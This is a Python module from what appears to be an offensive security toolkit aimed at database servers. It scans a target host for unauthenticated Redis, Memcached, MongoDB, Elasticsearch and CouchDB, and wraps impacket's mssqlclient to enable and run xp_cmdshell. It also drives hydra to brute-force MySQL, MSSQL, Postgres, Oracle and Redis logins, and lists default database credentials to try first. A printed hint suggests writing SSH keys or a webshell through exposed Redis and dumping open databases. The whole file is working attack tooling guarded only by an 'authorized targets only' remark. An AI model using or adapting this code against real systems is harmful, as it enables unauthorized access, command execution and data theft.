from __future__ import annotations

import socket

from rich.prompt import Prompt
from rich.table import Table

from .utils import console, header, pause, resolve_tool, run_tool

DEFAULT_CREDS = {
    "MySQL": "root:(blank), root:root, root:toor",
    "MSSQL": "sa:(blank), sa:sa, sa:Password1",
    "PostgreSQL": "postgres:postgres, postgres:(blank)",
    "MongoDB": "(no auth by default < 3.6)",
    "Redis": "(no auth by default)",
    "Oracle": "system:manager, scott:tiger, sys:change_on_install",
    "Elasticsearch": "elastic:changeme",
}


def _probe(host: str, port: int, send: bytes = b"", timeout: float = 4.0) -> str | None:
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        if send:
            s.sendall(send)
        s.settimeout(timeout)
        data = s.recv(2048)
        s.close()
        return data.decode(errors="replace")
    except Exception:
        return None


def nosql_exposed() -> None:
    header("Exposed database scan", "Check for unauthenticated DB services on a host")
    host = Prompt.ask("Target IP/host")
    t = Table(title=f"Database exposure on {host}")
    t.add_column("Service", style="bold")
    t.add_column("Port", justify="right")
    t.add_column("Result")

    # Redis — unauth if INFO returns data (not -NOAUTH)
    r = _probe(host, 6379, b"INFO\r\n")
    if r is None:
        redis = "[dim]closed[/]"
    elif "NOAUTH" in r or "WRONGPASS" in r:
        redis = "[yellow]open (auth required)[/]"
    elif "redis_version" in r:
        redis = "[red]UNAUTHENTICATED — full access![/]"
    else:
        redis = "open"
    t.add_row("Redis", "6379", redis)

    # Memcached — stats with no auth
    m = _probe(host, 11211, b"stats\r\n")
    t.add_row("Memcached", "11211",
              "[red]UNAUTHENTICATED[/]" if m and "STAT" in m else ("[dim]closed[/]" if m is None else "open"))

    # MongoDB — port reachable (wire protocol; presence is the signal)
    mongo = _probe(host, 27017)
    t.add_row("MongoDB", "27017", "[yellow]open[/]" if mongo is not None else "[dim]closed[/]")

    # Elasticsearch — HTTP, unauth if / returns cluster json
    import requests
    for name, port, path in [("Elasticsearch", 9200, "/"), ("CouchDB", 5984, "/_all_dbs")]:
        try:
            rr = requests.get(f"http://{host}:{port}{path}", timeout=4)
            if rr.status_code == 200 and ("cluster_name" in rr.text or "[" in rr.text):
                res = "[red]UNAUTHENTICATED[/]"
            elif rr.status_code == 401:
                res = "[yellow]open (auth required)[/]"
            else:
                res = f"HTTP {rr.status_code}"
        except Exception:
            res = "[dim]closed[/]"
        t.add_row(name, str(port), res)

    console.print(t)
    console.print("[bright_black]Redis unauth -> write SSH keys/webshell; Mongo/ES unauth "
                  "-> dump collections. Authorized targets only.[/]")
    pause()


def mssql_client() -> None:
    header("MSSQL client", "Connect & run xp_cmdshell (impacket mssqlclient)")
    tool = None
    for n in ("impacket-mssqlclient", "mssqlclient.py", "mssqlclient"):
        if resolve_tool(n):
            tool = n
            break
    if not tool:
        console.print("[yellow]mssqlclient not found[/] — [cyan]pipx install impacket[/]")
        return pause()
    domain = Prompt.ask("Domain (blank for local SQL auth)", default="")
    user = Prompt.ask("User", default="sa")
    pw = Prompt.ask("Password")
    target = Prompt.ask("Target IP")
    tgt = f"{domain}/{user}:{pw}@{target}" if domain else f"{user}:{pw}@{target}"
    args = [tgt] + (["-windows-auth"] if domain else [])
    console.print("[dim]In the SQL shell: enable_xp_cmdshell then xp_cmdshell whoami[/]")
    run_tool(tool, args)
    pause()


def db_bruteforce() -> None:
    header("DB login brute-force", "hydra against a database service")
    if not resolve_tool("hydra"):
        console.print("[yellow]hydra not installed.[/]")
        return pause()
    svc = Prompt.ask("Service", choices=["mysql", "mssql", "postgres", "oracle", "redis"],
                     default="mysql")
    target = Prompt.ask("Target IP")
    user = Prompt.ask("Username", default="root")
    wl = Prompt.ask("Password list path")
    run_tool("hydra", ["-l", user, "-P", wl, target, svc], wsl_pathify={3})
    pause()


def default_creds() -> None:
    header("Default DB credentials", "Common defaults to try first")
    t = Table()
    t.add_column("Database", style="bold cyan")
    t.add_column("Defaults", style="green")
    for db, creds in DEFAULT_CREDS.items():
        t.add_row(db, creds)
    console.print(t)
    pause()


MENU = {
    "1": ("Scan for exposed databases", nosql_exposed),
    "2": ("MSSQL client (xp_cmdshell)", mssql_client),
    "3": ("DB login brute-force (hydra)", db_bruteforce),
    "4": ("Default credentials list", default_creds),
}
